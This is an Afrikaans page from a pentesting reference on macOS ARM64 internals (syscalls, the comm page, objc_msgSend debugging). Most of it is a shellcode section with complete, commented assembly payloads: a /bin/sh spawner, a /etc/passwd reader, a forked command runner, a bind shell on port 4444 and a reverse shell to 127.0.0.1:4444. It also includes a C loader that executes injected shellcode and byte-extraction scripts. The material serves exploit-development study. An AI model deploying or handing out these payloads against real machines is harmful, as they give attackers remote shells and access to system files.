> Soms is dit makliker om die **gedekompileerde** kode van **`libsystem_kernel.dylib`** **as** om die **bronkode** na te gaan, omdat die kode van verskeie syscalls (BSD en Mach) via skripte gegenereer word (kyk kommentaar in die bronkode) terwyl jy in die dylib kan vind wat aangeroep word.

### machdep calls

XNU ondersteun 'n ander tipe oproepe wat machine dependent genoem word. Die nommers van hierdie oproepe hang af van die argitektuur en geen van die oproepe of nommers is gewaarborg om konstant te bly nie.

### comm page

Dit is 'n kernel-eienaarskap geheuebladsy wat in die adresruimte van elke gebruiker se proses gemap word. Dit is bedoel om die oorgang van user mode na kernel space vinniger te maak as om syscalls te gebruik vir kernel-dienste wat so gereeld gebruik word dat hierdie oorgang baie ondoeltreffend sou wees.

Byvoorbeeld lees die oproep `gettimeofdate` die waarde van `timeval` direk vanaf die comm page.

### objc_msgSend

Dit is uiters algemeen om hierdie funksie in Objective-C of Swift programme te vind. Hierdie funksie laat toe om 'n metode van 'n Objective-C object aan te roep.

Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):

- x0: self -> Aanwyser na die instansie
- x1: op -> Selector van die metode
- x2... -> Oorblywende argumente van die aangeroepde metode

As jy dus 'n breakpoint plaas voor die tak na hierdie funksie, kan jy maklik vind wat aangeroep word in lldb met (in hierdie voorbeeld roep die objek 'n objek van `NSConcreteTask` aan wat 'n opdrag sal uitvoer):
```bash
# Right in the line were objc_msgSend will be called
(lldb) po $x0
<NSConcreteTask: 0x1052308e0>

(lldb) x/s $x1
0x1736d3a6e: "launch"

(lldb) po [$x0 launchPath]
/bin/sh

(lldb) po [$x0 arguments]
<__NSArrayI 0x1736801e0>(
-c,
whoami
)
```
> [!TIP]
> Deur die omgewingsveranderlike **`NSObjCMessageLoggingEnabled=1`** te stel, is dit moontlik om te log wanneer hierdie funksie aangeroep word in 'n lêer soos `/tmp/msgSends-pid`.
>
> Verder, deur **`OBJC_HELP=1`** te stel en enige binary aan te roep, kan jy ander omgewingsveranderlikes sien wat jy kan gebruik om te **log** wanneer sekere Objc-C-aksies plaasvind.

Wanneer hierdie funksie aangeroep word, moet die aangeroep metode van die aangeduide instance gevind word; hiervoor word verskeie soektogte uitgevoer:

- Voer optimistiese cache-opsoek uit:
- As dit suksesvol is, klaar
- Verkry runtimeLock (read)
- If (realize && !cls->realized) realize class
- If (initialize && !cls->initialized) initialize class
- Probeer class se eie cache:
- As dit suksesvol is, klaar
- Probeer class method list:
- Indien gevind, vul cache en klaar
- Probeer superclass cache:
- As dit suksesvol is, klaar
- Probeer superclass method list:
- Indien gevind, vul cache en klaar
- If (resolver) try method resolver, and repeat from class lookup
- As dit nog hier is (= alles anders het misluk), probeer forwarder

### Shellcodes

Om te kompileer:
```bash
as -o shell.o shell.s
ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/CommandLineTools/SDKs/MacOSX.sdk/usr/lib

# You could also use this
ld -o shell shell.o -syslibroot $(xcrun -sdk macosx --show-sdk-path) -lSystem
```
Om die bytes te onttrek:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/b729f716aaf24cbc8109e0d94681ccb84c0b0c9e/helper/extract.sh
for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n '\\x'$c
done
```
Vir nuwer macOS:
```bash
# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/fc0742e9ebaf67c6a50f4c38d59459596e0a6c5d/helper/extract.sh
for s in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
echo -n $s | awk '{for (i = 7; i > 0; i -= 2) {printf "\\x" substr($0, i, 2)}}'
done
```
<details>

<summary>C code om die shellcode te toets</summary>
```c
// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
// gcc loader.c -o loader
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>

int (*sc)();

char shellcode[] = "<INSERT SHELLCODE HERE>";

int main(int argc, char **argv) {
printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));

void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);

if (ptr == MAP_FAILED) {
perror("mmap");
exit(-1);
}
printf("[+] SUCCESS: mmap\n");
printf("    |-> Return = %p\n", ptr);

void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
printf("[+] SUCCESS: memcpy\n");
printf("    |-> Return = %p\n", dst);

int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);

if (status == -1) {
perror("mprotect");
exit(-1);
}
printf("[+] SUCCESS: mprotect\n");
printf("    |-> Return = %d\n", status);

printf("[>] Trying to execute shellcode...\n");

sc = ptr;
sc();

return 0;
}
```
</details>

#### Shell

Geneem van [**here**](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/shell.s) en verduidelik.

{{#tabs}}
{{#tab name="with adr"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}

{{#tab name="with stack"}}
```armasm
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
; We are going to build the string "/bin/sh" and place it on the stack.

mov  x1, #0x622F  ; Move the lower half of "/bi" into x1. 0x62 = 'b', 0x2F = '/'.
movk x1, #0x6E69, lsl #16 ; Move the next half of "/bin" into x1, shifted left by 16. 0x6E = 'n', 0x69 = 'i'.
movk x1, #0x732F, lsl #32 ; Move the first half of "/sh" into x1, shifted left by 32. 0x73 = 's', 0x2F = '/'.
movk x1, #0x68, lsl #48   ; Move the last part of "/sh" into x1, shifted left by 48. 0x68 = 'h'.

str  x1, [sp, #-8] ; Store the value of x1 (the "/bin/sh" string) at the location `sp - 8`.

; Prepare arguments for the execve syscall.

mov  x1, #8       ; Set x1 to 8.
sub  x0, sp, x1   ; Subtract x1 (8) from the stack pointer (sp) and store the result in x0. This is the address of "/bin/sh" string on the stack.
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.

; Make the syscall.

mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

```
{{#endtab}}

{{#tab name="with adr for linux"}}
```armasm
; From https://8ksec.io/arm64-reversing-and-exploitation-part-5-writing-shellcode-8ksec-blogs/
.section __TEXT,__text ; This directive tells the assembler to place the following code in the __text section of the __TEXT segment.
.global _main         ; This makes the _main label globally visible, so that the linker can find it as the entry point of the program.
.align 2              ; This directive tells the assembler to align the start of the _main function to the next 4-byte boundary (2^2 = 4).

_main:
adr  x0, sh_path  ; This is the address of "/bin/sh".
mov  x1, xzr      ; Clear x1, because we need to pass NULL as the second argument to execve.
mov  x2, xzr      ; Clear x2, because we need to pass NULL as the third argument to execve.
mov  x16, #59     ; Move the execve syscall number (59) into x16.
svc  #0x1337      ; Make the syscall. The number 0x1337 doesn't actually matter, because the svc instruction always triggers a supervisor call, and the exact action is determined by the value in x16.

sh_path: .asciz "/bin/sh"
```
{{#endtab}}
{{#endtabs}}

#### Lees met cat

Die doel is om `execve("/bin/cat", ["/bin/cat", "/etc/passwd"], NULL)` uit te voer, dus is die tweede argument (x1) 'n array van params (wat in geheue beteken 'n stack van adresse).
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the execve syscall
sub sp, sp, #48        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, cat_path
str x0, [x1]           ; Store the address of "/bin/cat" as the first argument
adr x0, passwd_path    ; Get the address of "/etc/passwd"
str x0, [x1, #8]       ; Store the address of "/etc/passwd" as the second argument
str xzr, [x1, #16]     ; Store NULL as the third argument (end of arguments)

adr x0, cat_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


cat_path: .asciz "/bin/cat"
.align 2
passwd_path: .asciz "/etc/passwd"
```
#### Roep 'n opdrag met sh van 'n fork sodat die hoofproses nie gedood word nie
```armasm
.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
.global _main              ; Declare a global symbol _main
.align 2                   ; Align the beginning of the following code to a 4-byte boundary

_main:
; Prepare the arguments for the fork syscall
mov x16, #2            ; Load the syscall number for fork (2) into x8
svc 0                  ; Make the syscall
cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
beq _loop              ; If not child process, loop

; Prepare the arguments for the execve syscall

sub sp, sp, #64        ; Allocate space on the stack
mov x1, sp             ; x1 will hold the address of the argument array
adr x0, sh_path
str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
adr x0, sh_c_option    ; Get the address of "-c"
str x0, [x1, #8]       ; Store the address of "-c" as the second argument
adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)

adr x0, sh_path
mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
mov x16, #59           ; Load the syscall number for execve (59) into x8
svc 0                  ; Make the syscall


_exit:
mov x16, #1            ; Load the syscall number for exit (1) into x8
mov x0, #0             ; Set exit status code to 0
svc 0                  ; Make the syscall

_loop: b _loop

sh_path: .asciz "/bin/sh"
.align 2
sh_c_option: .asciz "-c"
.align 2
touch_command: .asciz "touch /tmp/lalala"
```
#### Bind shell

Bind shell van [https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s](https://raw.githubusercontent.com/daem0nc0re/macOS_ARM64_Shellcode/master/bindshell.s) op **port 4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_bind:
/*
* bind(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 0.0.0.0 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #104
svc  #0x1337

call_listen:
// listen(s, 2)
mvn  x0, x3
lsr  x1, x2, #3
mov  x16, #106
svc  #0x1337

call_accept:
// c = accept(s, 0, 0)
mvn  x0, x3
mov  x1, xzr
mov  x2, xzr
mov  x16, #30
svc  #0x1337

mvn  x3, x0
lsr  x2, x16, #4
lsl  x2, x2, #2

call_dup:
// dup(c, 2) -> dup(c, 1) -> dup(c, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
#### Reverse shell

Van [https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s](https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/reverseshell.s), revshell na **127.0.0.1:4444**
```armasm
.section __TEXT,__text
.global _main
.align 2
_main:
call_socket:
// s = socket(AF_INET = 2, SOCK_STREAM = 1, 0)
mov  x16, #97
lsr  x1, x16, #6
lsl  x0, x1, #1
mov  x2, xzr
svc  #0x1337

// save s
mvn  x3, x0

call_connect:
/*
* connect(s, &sockaddr, 0x10)
*
* struct sockaddr_in {
*     __uint8_t       sin_len;     // sizeof(struct sockaddr_in) = 0x10
*     sa_family_t     sin_family;  // AF_INET = 2
*     in_port_t       sin_port;    // 4444 = 0x115C
*     struct  in_addr sin_addr;    // 127.0.0.1 (4 bytes)
*     char            sin_zero[8]; // Don't care
* };
*/
mov  x1, #0x0210
movk x1, #0x5C11, lsl #16
movk x1, #0x007F, lsl #32
movk x1, #0x0100, lsl #48
str  x1, [sp, #-8]
mov  x2, #8
sub  x1, sp, x2
mov  x2, #16
mov  x16, #98
svc  #0x1337

lsr  x2, x2, #2

call_dup:
// dup(s, 2) -> dup(s, 1) -> dup(s, 0)
mvn  x0, x3
lsr  x2, x2, #1
mov  x1, x2
mov  x16, #90
svc  #0x1337
mov  x10, xzr
cmp  x10, x2
bne  call_dup

call_execve:
// execve("/bin/sh", 0, 0)
mov  x1, #0x622F
movk x1, #0x6E69, lsl #16
movk x1, #0x732F, lsl #32
movk x1, #0x68, lsl #48
str  x1, [sp, #-8]
mov	 x1, #8
sub  x0, sp, x1
mov  x1, xzr
mov  x2, xzr
mov  x16, #59
svc  #0x1337
```
{{#include ../../../banners/hacktricks-training.md}}
